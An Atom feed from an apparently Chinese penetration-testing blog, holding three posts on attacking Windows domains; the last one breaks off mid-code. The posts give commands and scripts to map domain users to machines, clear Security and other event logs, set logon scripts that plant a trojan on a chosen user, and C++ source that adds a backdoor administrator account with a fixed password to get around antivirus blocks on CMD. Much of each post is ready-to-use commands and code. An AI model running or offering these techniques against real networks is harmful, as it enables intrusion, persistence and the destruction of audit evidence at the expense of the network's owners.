<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RcoIl的窝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rcoil.me/"/>
  <updated>2018-11-27T03:31:50.019Z</updated>
  <id>https://rcoil.me/</id>
  
  <author>
    <name>RcoIl</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【域渗透】获取域环境内用户登录信息</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>https://rcoil.me/2018/11/【域渗透】获取域环境内用户登录信息/</id>
    <published>2018-11-26T08:06:48.000Z</published>
    <updated>2018-11-27T03:31:50.019Z</updated>
    
    <content type="html"><![CDATA[<p>之前见到有人在讨论<a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢</a>，集思广益，结合答复及自己的观点，总结了以下内容。<br><a id="more"></a></p><h2 id="0x00-adfind-未实践"><a href="#0x00-adfind-未实践" class="headerlink" title="0x00 adfind(未实践)"></a>0x00 adfind(未实践)</h2><p>有时候管理员会设置域用户只可以登录指定的的域内计算机，使用adfind或者powerview导出域用户信息可以查看；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看域内用户详细信息：</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc u:username(目标用户)</span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h DNS_SERVER_IP -sc u:*</span><br><span class="line">详见：http://www.joeware.net/freetools/tools/adfind/usage.htm</span><br></pre></td></tr></table></figure></p><p>powerview在域内执行就可以。</p><h2 id="0x01-查看域内机器的用户目录文件夹"><a href="#0x01-查看域内机器的用户目录文件夹" class="headerlink" title="0x01 查看域内机器的用户目录文件夹"></a>0x01 查看域内机器的用户目录文件夹</h2><p>确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ password /u:domain\domain_admins_user</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (</span><br><span class="line">                <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ /<span class="built_in">del</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>域管不用建立连接就可以访问域内计算机资源（未实践），因此以域管权限运行时可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="0x02-域控日志"><a href="#0x02-域控日志" class="headerlink" title="0x02 域控日志"></a>0x02 域控日志</h2><p><code>wevtutil</code>为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用<code>epl</code>参数，直接重定向输出即可。<br><code>wevtutil</code>常用的场景是清理日志。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl application</span><br><span class="line">wevtutil cl security</span><br><span class="line">wevtutil cl system</span><br><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure></p><p>而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功）</p><font color="#0099ff" size="3">使用<code>wevtutil</code>结合python</font><ul><li><p>wevtutil</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /q:"Event[System[(EventID=<span class="number">4624</span> or EventID=<span class="number">4768</span> or EventID=<span class="number">4776</span>)]]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">1</span> &gt; EvtLogon.dat</span><br></pre></td></tr></table></figure></li><li><p>参数说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qe: 从日志或日志文件中查询事件；（默认xml格式显示）</span><br><span class="line">Security: 指定安全事件的日志；</span><br><span class="line">/q: 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；</span><br><span class="line">/f: 以text格式显示</span><br><span class="line">/rd: 指定读取事件的方向</span><br><span class="line">/c: 指定个数</span><br><span class="line">该命令其它参数参考wevtutil /?</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="comment"># Python v2.7.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">evt = <span class="string">'EvtLogon.dat'</span></span><br><span class="line">fevt = open(evt,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># For Eliminate redundancies</span></span><br><span class="line">    lastdate = <span class="string">'lastdate'</span></span><br><span class="line">    lasttask = <span class="string">'lasttask'</span></span><br><span class="line">    <span class="comment"># 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'LogonStat.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        csv_write = csv.writer(csvfile)</span><br><span class="line">        csv_write.writerow([<span class="string">"Task"</span>, <span class="string">"Date"</span>, <span class="string">"Account Name"</span>, <span class="string">"Account Domain"</span>, <span class="string">"Logon Address"</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> eachline <span class="keyword">in</span> fevt:</span><br><span class="line">            <span class="keyword">if</span> eachline.find(<span class="string">'Event['</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = <span class="string">''</span></span><br><span class="line">                date = <span class="string">''</span></span><br><span class="line">                accname = <span class="string">''</span></span><br><span class="line">                logontype = <span class="string">''</span></span><br><span class="line">                logonaddr = <span class="string">''</span></span><br><span class="line">                skip = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Date:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                date = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Task:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (date == lastdate) <span class="keyword">and</span> (task == lasttask): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lastdate = date</span><br><span class="line">                    lasttask = task</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Name:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accname = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (task == <span class="string">'Logon'</span>) <span class="keyword">and</span> (accname.find(<span class="string">'$'</span>) &gt; <span class="number">-1</span>): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Domain:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accdomain = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Source Network Address:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                logonaddr = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">                <span class="keyword">if</span> logonaddr == <span class="string">'-'</span>:</span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (skip == <span class="number">0</span>) <span class="keyword">and</span> (task == <span class="string">'Logon'</span>):</span><br><span class="line">                    LogonStat = [[task, date, accname, accdomain, logonaddr]]</span><br><span class="line">                    csv_write.writerows(LogonStat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error: %s'</span> % e</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fevt.close()</span><br><span class="line">csvfile.close()</span><br></pre></td></tr></table></figure></li></ul><p>PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='<span class="number">10</span>'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=<span class="number">4624</span>) and TimeCreated[timediff(@SystemTime) &amp;lt;= <span class="number">2592000000</span>]]]"</span><br><span class="line"></span><br><span class="line">wevtutil qe Security /q:"*[System[(Keywords='<span class="number">0</span>x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-【参考】"><a href="#0x03-【参考】" class="headerlink" title="0x03 【参考】"></a>0x03 【参考】</h2><p><a href="http://cate4cafe.com/2018/11/21/wevtutil%E7%AD%9B%E9%80%89windows%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C/" target="_blank" rel="noopener">wevtutil筛选windows日志查询结果</a><br><a href="https://blog.csdn.net/dearggae/article/details/70147511" target="_blank" rel="noopener">[Tools]获取域环境内所有用户登录信息（附源码及程序）</a><br><a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢？</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前见到有人在讨论&lt;a href=&quot;https://www.t00ls.net/viewthread.php?tid=47649&amp;amp;extra=&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;域内用户在域内的机器ip怎么查呢&lt;/a&gt;，集思广益，结合答复及自己的观点，总结了以下内容。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/"/>
    <id>https://rcoil.me/2018/11/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/</id>
    <published>2018-11-16T08:33:21.000Z</published>
    <updated>2018-12-14T06:36:44.982Z</updated>
    
    <content type="html"><![CDATA[<p><font color="#DC143C" size="3">摘要：</font>采取直接的手段不能够解决问题，只好曲线救国。<br><a id="more"></a><br>声明：只是作为搬运工。</p><h2 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h2><ul><li><p>利用前置条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域管理员权限</span><br></pre></td></tr></table></figure></li><li><p>使用场合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">知道目标域用户名称，探测不到域用户对应机器名或IP；</span><br><span class="line">知道目标机器IP，但是无法通往上控；</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h2><p><font color="#DC143C" size="3">PS：</font>以下测试全部在域控上执行</p><h3 id="一）使用dsmod给指定域用户设置登陆脚本"><a href="#一）使用dsmod给指定域用户设置登陆脚本" class="headerlink" title="一）使用dsmod给指定域用户设置登陆脚本"></a>一）使用dsmod给指定域用户设置登陆脚本</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">dsmod user -loscr &quot;test.bat&quot; &quot;CN=x,OU=x,DC=x,DC=x,DC=x&quot;</span><br></pre></td></tr></table></figure></p><p>测试结果：<br>PS: 测试机为<code>Win-XP x86</code>，第二次注销重新登陆bat脚本才执行，bat内容为<a href="mailto:`@calc.exe" target="_blank" rel="noopener">`@calc.exe</a>`。<br><img src="/image/在域控上使用cmd更改域用户配置文件中的登录脚本/blog_2018-11-16_18-18-23.png" alt=""></p><h3 id="二）登陆脚本给指定用户种马"><a href="#二）登陆脚本给指定用户种马" class="headerlink" title="二）登陆脚本给指定用户种马"></a>二）登陆脚本给指定用户种马</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">net user xp /scriptpath:test.bat # 内网域成员机器可以使用</span><br><span class="line">gpupdate /force  # 立即刷新组策略 使用域管权限执行  不执行也行,等待随机</span><br></pre></td></tr></table></figure></p><p>测试结果与第一种方法一致</p><h3 id="三）使用PowerShell的Active-Directory模块"><a href="#三）使用PowerShell的Active-Directory模块" class="headerlink" title="三）使用PowerShell的Active Directory模块"></a>三）使用PowerShell的Active Directory模块</h3><p><code>ActiveDirectory.psd1</code>项目：<a href="https://github.com/samratashok/ADModule" target="_blank" rel="noopener">ADModule</a><br>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory.psd1; 或者Import-Module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADUser -Identity AD_USER -ProfilePath &quot;filepath&quot; -ScriptPath &quot;filename&quot;</span><br></pre></td></tr></table></figure></p><p>参数说明</p><ul><li><p>Identity<br>通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个名字</span><br><span class="line">GUID（objectGUID）</span><br><span class="line">安全标识符（objectSid）</span><br><span class="line">SAM帐户名称（sAMAccountName）</span><br></pre></td></tr></table></figure></li><li><p>ProfilePath<br>指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</p></li><li>ScriptPath<br>指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</li></ul><p>测试结果与第一种方法一致</p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/</a><br><a href="https://www.t00ls.net/thread-48540-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-48540-1-1.html</a><br><a href="https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html</a><br><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;#DC143C&quot; size=&quot;3&quot;&gt;摘要：&lt;/font&gt;采取直接的手段不能够解决问题，只好曲线救国。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【C++】创建用户，并添加至管理组</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90C-%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84/"/>
    <id>https://rcoil.me/2018/11/【C-】创建用户，并添加至管理组/</id>
    <published>2018-11-15T03:52:27.000Z</published>
    <updated>2018-11-17T16:49:28.274Z</updated>
    
    <content type="html"><![CDATA[<p>摘要: 因有些需求，需要本地/远程添加用户。所以直接选择<code>Windows API函数</code>进行编写，因为部分杀软限制了<code>CMD</code>。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">程序名称：添加系统用户.exe(也可创建dll)</span><br><span class="line">编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64</span><br><span class="line">编写语言：C++ (C#存在版本限制)</span><br><span class="line">测试条件：以管理员运行</span><br><span class="line">测试工具：zzz_exploit or other</span><br><span class="line">测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加</span><br></pre></td></tr></table></figure></p><h2 id="0x00-思路及原理"><a href="#0x00-思路及原理" class="headerlink" title="0x00 思路及原理"></a>0x00 思路及原理</h2><h3 id="一）编程思路"><a href="#一）编程思路" class="headerlink" title="一）编程思路"></a>一）编程思路</h3><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netuseradd" target="_blank" rel="noopener">NetUserAdd函数</a>添加普通权限的用户并指定级别。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetUserAdd</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD parm_err</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers" target="_blank" rel="noopener">NetLocalGroupAddMembers函数</a>将现有用户账号添加到现有本地组。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetLocalGroupAddMembers</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR groupname, <span class="comment">// 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   totalentries <span class="comment">// 指定buf参数指向的缓冲区中的条目数。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><h3 id="二）编写思路"><a href="#二）编写思路" class="headerlink" title="二）编写思路"></a>二）编写思路</h3><ul><li>定义USER_INFO_1 结构体<br>该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。</li><li>调用NetUserAdd添加普通权限账户</li><li>调用NetLocalGroupAddMembers添加到管理员组</li></ul><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><h3 id="一）exe生成"><a href="#一）exe生成" class="headerlink" title="一）exe生成"></a>一）exe生成</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserInfoAdd.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"netapi32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 定义USER_INFO_1结构体</span></span><br><span class="line">USER_INFO_1 UserInfo;</span><br><span class="line">DWORD dwLevel = <span class="number">1</span>;</span><br><span class="line">DWORD dwError = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">UserInfo.usri1_name = <span class="string">L"Admins"</span>;            <span class="comment">// 账户    </span></span><br><span class="line">UserInfo.usri1_password = <span class="string">L"P@ssword233"</span>;      <span class="comment">// 密码</span></span><br><span class="line">UserInfo.usri1_priv = USER_PRIV_USER;</span><br><span class="line">UserInfo.usri1_home_dir = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_comment = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_flags = UF_SCRIPT;</span><br><span class="line">UserInfo.usri1_script_path = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加名为Admins的用户,密码为P@ssword233 </span></span><br><span class="line">NetUserAdd(<span class="literal">NULL</span>, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加用户到administrators组</span></span><br><span class="line">LOCALGROUP_MEMBERS_INFO_3 account;</span><br><span class="line">account.lgrmi3_domainandname = UserInfo.usri1_name;</span><br><span class="line">NetLocalGroupAddMembers(<span class="literal">NULL</span>, <span 